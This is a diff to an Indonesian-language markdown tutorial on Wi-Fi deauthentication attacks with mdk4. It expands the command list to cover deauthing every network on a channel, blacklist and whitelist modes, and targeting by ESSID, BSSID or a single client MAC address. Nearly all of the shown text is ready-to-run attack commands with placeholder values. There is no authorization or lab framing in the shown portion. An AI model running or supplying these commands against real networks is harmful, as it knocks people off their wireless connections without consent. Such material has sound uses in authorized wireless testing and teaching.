@@ -54,29 +54,51 @@ sudo airodump-ng [interface]
 
 **2. Jalankan MDK4:**
 
-   1. Deauth semua client yang terhubung:
+   1. Deauth semua Wi-Fi yang ada di channel tertentu:
 
       ```
-      sudo mdk4 [interface] d -E [essid] -B [bssid] -c [channel]
+      sudo mdk4 [interface] d -c [channel]
       ```
 
    2. Blacklist mode:
 
       ```
-      sudo mdk4 [interface] d -b [file_blacklist] -E [essid] -B [bssid] -c [channel] 
+      sudo mdk4 [interface] d -b [file_blacklist] -c [channel]
+      ```
+      
+      - Blacklist mode hanya melakukan deauth terhadap MAC address yang ada di file `[file_blacklist]`.
+      - File `[file_blacklist]` berisi MAC address AP (BSSID) atau client yang akan di-deauth.
+
+   3. Whitelist mode:
+
+      ```
+      sudo mdk4 [interface] d -w [file_whitelist] -c [channel]
       ```
 
-      Blacklist mode itu hanya melakukan deauth terhadap client yang ada di file `[file_blacklist]`. Client lainnya akan diabaikan.
-   2. Whitelist mode:
+      - Whitelist mode melakukan deauth terhadap semua MAC address, kecuali yang ada di file `[file_whitelist]`.
+      - File `[file_whitelist]` berisi MAC address AP (BSSID) atau client yang akan dilindungi dari deauth.
+   4. Target AP berdasarkan ESSID:
 
       ```
-      sudo mdk4 [interface] d -w [file_whitelist] -E [essid] -B [bssid] -c [channel]
+      sudo mdk4 [interface] d -E [essid] -c [channel]
+      ```
+   5. Target AP berdasarkan BSSID:
+
+      ```
+      sudo mdk4 [interface] d -B [bssid] -c [channel]
+      ```
+   6. Target client spesifik:
+
+      ```
+      sudo mdk4 [interface] d -S [mac_client] -c [channel]
+      ```
+   7. Whitelist station spesifik:
+
+      ```
+      sudo mdk4 [interface] d -W [mac_client] -c [channel]
       ```
 
-      Whitelist mode itu kebalikan dari blacklist mode. Semua client akan di-deauth, kecuali yang ada di file `[file_whitelist].` (dilindungi).
-
-   > **Catatan:**  
-   > Kalu ingin deauth client tertentu gunakan opsi `-S [mac_client]`.
+      Whitelist station spesifik akan melakukan deauth terhadap semua client, kecuali client `[mac_client]`.
 
 ## Video Demonstrasi
 
